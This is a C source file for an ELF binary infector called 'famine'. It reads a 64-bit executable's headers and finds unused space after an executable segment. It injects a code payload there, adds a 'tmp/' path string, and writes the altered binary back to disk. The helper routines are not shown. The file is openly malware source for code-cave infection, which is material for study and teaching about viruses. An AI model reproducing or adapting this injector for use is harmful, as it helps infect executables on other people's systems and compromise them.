#include "../include/famine.h"

struct code glob_code;
#define PATH "tmp/\n"
#define LENPATH strlen(PATH)

void find_offset_injection(unsigned char *buf, struct ELFheaders64 elfheader) {
    size_t diff;
    struct pheaders64 *pheaders;

    pheaders = get_program_headers_64(buf, elfheader);
    for (int i = 0; i < elfheader.e_phnum - 1; i++) {
        diff = (pheaders[i].p_offset + pheaders[i].p_memsz) - pheaders[i + 1].p_offset;
        if ((pheaders[i].p_flags & 0x01) != 0 && diff > glob_code.code_size)
            glob_code.offset_injection = pheaders[i].p_offset + pheaders[i].p_memsz;
    }
    free(pheaders);
}

int famine(unsigned char *buf, size_t size) {
    struct ELFheaders64 elfheader;
    struct sheaders64 *sheaders;

    elfheader = get_elfHeader64_little_endian(buf);
    sheaders = get_section_headers_64(buf, elfheader);
    glob_code.code = get_code(&glob_code.code_size);
    glob_code.strings_size = LENPATH;
    glob_code.strings = malloc(glob_code.strings_size + 1);
    memcpy(glob_code.strings, PATH, glob_code.strings_size);

    find_offset_injection(buf, elfheader);
    buf = change_buffer(&glob_code, buf, elfheader, size);
    write_file(buf, size);
    free(buf);
    free(sheaders);
    free(glob_code.code);
    free(glob_code.strings);
    return (0);
}

int main(int argc, char **argv) {
    int fd = -1;
    struct stat *buf = NULL;
    void *ptr = NULL;
    int res = 0;

    fd = get_fd(argc, argv, &buf);
    if (fd < 0) {
        if (buf) {
            free(buf);
        }
	    return (1);
    }
    ptr = ft_mmap(buf->st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (ptr == NULL || S_ISREG(buf->st_mode) == 0) {
        perror("Error mmap");
        return (1);
    }
    if (check_file(ptr, buf->st_size) != 0) {
        write(1, "Error: not a valid file\n", strlen("Error: not a valid file\n"));
        return (1);
    }
    res = famine(ptr, buf->st_size);
    munmap(ptr, buf->st_size);
    free(buf);
    return (res);
}